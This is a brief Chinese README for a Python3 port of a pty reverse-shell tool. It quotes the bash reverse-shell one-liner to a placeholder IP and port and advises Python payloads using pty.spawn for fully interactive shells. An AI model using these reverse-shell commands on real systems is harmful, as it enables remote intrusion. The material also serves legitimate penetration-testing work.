Python3-pty-shells
=================

这是一个八九年前的项目，但是这是用Python2写的，如今他已经无法兼容Python3，而如今连Ubuntu的最新版都默认预装Python3，要使用Python2还得另外安装，所以我把它修改了一下以便兼容Python3，不得不说这个项目非常的强，使用它得到的shell和本地的bash没有任何区别，你可以使用CTRL+C，CTRL+Z和CTRL+D，并且可以使用vi、nano等会阻塞当前终端的命令

不过你最好使用的Payload是Python写的，而不是最常用的bash一句话：bash -i >& /dev/tcp/**IP**/**PORT** 0>&1，如果你使用bash，会导致功能不完全，比如在bash回连的情况下，当你使用Ping命令时，会导致shell阻塞，这时你使用Ctrl+C都无济于事，不过还是可以使用nano和vi等命令。

二来使用Python的Payload的话，最好使用pty.spawn("/bin/bash")而不是subprocess.call或者其他



第三，如果你懒得折腾，那还是使用nc+bash吧



作者项目地址：https://github.com/infodox/python-pty-shells